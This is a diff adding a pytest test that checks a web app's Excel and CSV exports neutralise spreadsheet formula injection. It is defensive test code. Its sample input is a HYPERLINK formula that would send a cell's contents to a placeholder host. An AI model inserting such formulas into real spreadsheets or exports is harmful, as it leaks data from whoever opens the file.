@@ -99,3 +99,25 @@ def test_a_made_up_forwarded_for_header_does_not_reset_the_caps(mem_store: Any) 
         assert routes.client_ip("203.0.113.5, 198.51.100.7", "10.1.1.1") == "198.51.100.7"
         assert routes.client_ip("", "10.1.1.1") == "10.1.1.1"
     routes._unlock_log.clear()
+
+
+def test_text_that_excel_would_run_is_exported_as_text(client: TestClient) -> None:
+    """A value read from a photo (or a name typed by a person) that starts with "=" must not become a
+    formula in the workbook or the verifier pack's CSV files, which verifiers open in Excel."""
+    import csv
+    import zipfile
+
+    import openpyxl
+
+    ev = next(e for e in client.get(f"/api/projects/{PID}/evidence").json() if e["status"] == "NEEDS_REVIEW")
+    bad = '=HYPERLINK("http://example.invalid/?x="&A1,"open")'
+    edit = {"action": "edit", "value_text": bad, "value_num": "15.4", "user": "=1+1"}
+    assert client.patch(f"/api/projects/{PID}/evidence/{ev['id']}", json=edit).status_code == 200
+    wb = openpyxl.load_workbook(io.BytesIO(client.get(f"/api/projects/{PID}/export/xlsx").content))
+    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
+    assert not [c.coordinate for c in cells if c.data_type == "f"]
+    assert any(c.value == bad for c in cells)  # kept, as text
+    z = zipfile.ZipFile(io.BytesIO(client.get(f"/api/projects/{PID}/export/pack").content))
+    for name in (n for n in z.namelist() if n.endswith(".csv")):
+        for row in csv.reader(io.StringIO(z.read(name).decode("utf-8-sig"))):
+            assert not [v for v in row if v[:1] in ("=", "@", "+")], name
